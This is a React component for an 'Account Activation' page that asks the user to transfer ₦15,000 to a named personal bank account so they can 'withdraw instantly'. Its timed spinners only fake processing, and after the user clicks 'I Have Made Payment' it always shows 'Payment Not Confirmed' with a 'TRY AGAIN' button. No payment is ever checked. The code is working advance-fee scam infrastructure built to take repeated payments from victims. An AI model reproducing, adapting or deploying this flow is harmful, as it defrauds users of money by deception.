
import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { ArrowLeft, Copy, Wallet, User2, Banknote } from "lucide-react";
import { useAuth } from "@/contexts/AuthContext";
import { Button } from "@/components/ui/button";
import { toast } from "sonner";
import {
  Dialog,
  DialogContent,
} from "@/components/ui/dialog";

const ActivateAccount: React.FC = () => {
  const navigate = useNavigate();
  const { user } = useAuth();
  const [isProcessing, setIsProcessing] = useState(false);
  const [showPaymentDetails, setShowPaymentDetails] = useState(false);
  const [isActivating, setIsActivating] = useState(false);
  const [showErrorDialog, setShowErrorDialog] = useState(false);

  const accountDetails = {
    bankName: "Sterling Bank",
    accountNumber: "0118697498",
    accountName: "JUDE SAMUEL",
    amount: "₦15,000"
  };

  const handleBack = () => {
    if (showPaymentDetails) {
      setShowPaymentDetails(false);
    } else {
      navigate("/dashboard");
    }
  };

  const handleActivateNow = () => {
    setIsProcessing(true);
    
    // 6 seconds loading
    setTimeout(() => {
      setIsProcessing(false);
      setShowPaymentDetails(true);
    }, 6000);
  };

  const handleCopyClick = (text: string, label: string) => {
    navigator.clipboard.writeText(text)
      .then(() => {
        toast.success(`${label} copied!`);
      })
      .catch(() => {
        toast.error("Failed to copy");
      });
  };

  const handlePaymentConfirmation = () => {
    setIsActivating(true);
    
    // 9 seconds loading for account activation
    setTimeout(() => {
      setIsActivating(false);
      setShowErrorDialog(true);
    }, 9000);
  };

  const handleCloseError = () => {
    setShowErrorDialog(false);
  };

  if (isProcessing) {
    return (
      <div className="min-h-screen bg-white flex flex-col items-center justify-center">
        <div className="w-16 h-16 border-4 border-green-800 border-t-transparent rounded-full animate-spin mb-4"></div>
        <p className="text-lg text-green-800 font-medium">Processing activation...</p>
      </div>
    );
  }

  if (showPaymentDetails) {
    return (
      <div className="min-h-screen bg-white">
        <div className="flex items-center p-2 border-b">
          <button onClick={handleBack} className="mr-2">
            <ArrowLeft size={16} className="text-green-800" />
          </button>
          <h1 className="text-sm font-medium text-gray-800">Account Activation Payment</h1>
        </div>

        <div className="p-3 max-w-sm mx-auto">
          <div className="mb-4">
            <h2 className="text-lg font-bold">Account Activation Code</h2>
            <p className="text-gray-500 text-xs mt-1">
              Transfer ₦15,000 To This Account Below To Activate Your Account
            </p>
          </div>
          
          <div className="bg-gray-50 rounded-lg overflow-hidden text-sm">
            <div className="p-3 flex justify-between items-center">
              <div className="flex-1">
                <div className="flex items-center">
                  <div className="bg-gray-100 p-1.5 rounded-md mr-3">
                    <Banknote size={20} className="text-green-800" />
                  </div>
                  <div>
                    <p className="text-gray-500 text-xs">Bank Name</p>
                    <p className="font-bold text-green-800 text-sm">{accountDetails.bankName}</p>
                  </div>
                </div>
              </div>
              <div className="flex items-center text-blue-600">
                <span className="bg-green-100 px-2 py-0.5 rounded-md text-green-600 text-xs">Active</span>
              </div>
            </div>
            
            <div className="border-t p-3 flex justify-between items-center">
              <div className="flex items-center">
                <div className="bg-gray-200 p-1.5 rounded-md mr-3 w-7 h-7 flex items-center justify-center">
                  <span className="font-mono text-xs">123</span>
                </div>
                <div>
                  <p className="text-gray-500 text-xs">Account Number</p>
                  <p className="font-bold text-gray-800 text-sm">{accountDetails.accountNumber}</p>
                </div>
              </div>
              <Button 
                variant="outline" 
                size="sm"
                className="bg-green-800 text-white hover:bg-green-700 text-xs px-2 py-1 h-7"
                onClick={() => handleCopyClick(accountDetails.accountNumber, "Account number")}
              >
                <Copy size={14} className="mr-1" /> Copy
              </Button>
            </div>
            
            <div className="border-t p-3 flex justify-between items-center">
              <div className="flex items-center">
                <div className="bg-gray-200 p-1.5 rounded-md mr-3 w-7 h-7 flex items-center justify-center">
                  <User2 size={16} className="text-gray-600" />
                </div>
                <div>
                  <p className="text-gray-500 text-xs">Account Name</p>
                  <p className="font-bold text-gray-800 text-sm">{accountDetails.accountName}</p>
                </div>
              </div>
            </div>
            
            <div className="border-t p-3 flex justify-between items-center">
              <div className="flex items-center">
                <div className="bg-gray-200 p-1.5 rounded-md mr-3 w-7 h-7 flex items-center justify-center">
                  <Wallet size={16} className="text-blue-600" />
                </div>
                <div>
                  <p className="text-gray-500 text-xs">Amount</p>
                  <p className="font-bold text-green-800 text-sm">{accountDetails.amount}</p>
                </div>
              </div>
            </div>
          </div>

          <div className="mt-4 bg-gray-100 p-3 rounded-lg">
            <p className="text-gray-700 text-xs">
              Hi, {user?.firstName || "User"}
            </p>
            <p className="text-gray-700 text-xs mt-1">
              Make A One Time Payment In Bank Details Above To Activate Your Account And Withdraw Instantly
            </p>
          </div>

          <button
            onClick={handlePaymentConfirmation}
            className="w-full bg-green-800 text-white py-2 rounded-lg mt-3 text-sm font-medium"
            disabled={isActivating}
          >
            {isActivating ? "Account Activation In Progress..." : "I Have Made Payment"}
          </button>
        </div>

        {/* Account Activation Loading Dialog */}
        <Dialog open={isActivating} onOpenChange={() => {}}>
          <DialogContent className="sm:max-w-md p-0 gap-0">
            <div className="p-6">
              <h2 className="text-xl font-bold text-center mb-6">Account Activation In Progress</h2>
              <div className="flex items-center justify-center">
                <div className="w-16 h-16 border-4 border-green-800 border-t-transparent rounded-full animate-spin"></div>
              </div>
            </div>
          </DialogContent>
        </Dialog>
        
        {/* Payment Error Dialog */}
        <Dialog open={showErrorDialog} onOpenChange={setShowErrorDialog}>
          <DialogContent className="sm:max-w-md p-0 gap-0">
            <div className="p-6">
              <div className="flex flex-col items-center mb-4">
                <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mb-4">
                  <svg width="36" height="36" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <circle cx="12" cy="12" r="10" stroke="#EF4444" strokeWidth="2"/>
                    <line x1="15" y1="9" x2="9" y2="15" stroke="#EF4444" strokeWidth="2"/>
                    <line x1="9" y1="9" x2="15" y2="15" stroke="#EF4444" strokeWidth="2"/>
                  </svg>
                </div>
                <h2 className="text-xl font-bold text-center text-red-600">Payment Not Confirmed</h2>
              </div>
              <p className="text-center mb-6">Payment verification failed. Please try again or contact support.</p>
              <button
                onClick={handleCloseError}
                className="w-full bg-red-600 text-white py-2 border border-red-600 font-bold rounded-md"
              >
                TRY AGAIN
              </button>
            </div>
          </DialogContent>
        </Dialog>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white">
      <div className="flex items-center p-4 border-b">
        <button onClick={handleBack} className="mr-3">
          <ArrowLeft size={20} className="text-green-800" />
        </button>
        <h1 className="text-lg font-bold text-green-800">Account Activation</h1>
      </div>

      <div className="p-6">
        <div className="text-center mb-8">
          <h2 className="text-2xl font-bold text-green-800 mb-2">Activate Your Account</h2>
          <p className="text-gray-600">Review your details and activate your account</p>
        </div>

        <div className="bg-gray-50 rounded-lg p-6 mb-6">
          <h3 className="text-lg font-semibold mb-4">Account Details</h3>
          
          <div className="space-y-3">
            <div className="flex justify-between">
              <span className="text-gray-600">First Name:</span>
              <span className="font-medium">{user?.firstName}</span>
            </div>
            
            <div className="flex justify-between">
              <span className="text-gray-600">Last Name:</span>
              <span className="font-medium">{user?.lastName}</span>
            </div>
            
            <div className="flex justify-between">
              <span className="text-gray-600">Email:</span>
              <span className="font-medium">{user?.email}</span>
            </div>
            
            <div className="flex justify-between">
              <span className="text-gray-600">Account ID:</span>
              <span className="font-medium">{user?.id}</span>
            </div>
            
            <div className="flex justify-between">
              <span className="text-gray-600">Status:</span>
              <span className="text-red-500 font-medium">Not Activated</span>
            </div>
          </div>
        </div>

        <button
          onClick={handleActivateNow}
          className="w-full bg-green-800 text-white py-4 rounded-lg font-medium text-lg"
        >
          Activate Now
        </button>
      </div>
    </div>
  );
};

export default ActivateAccount;
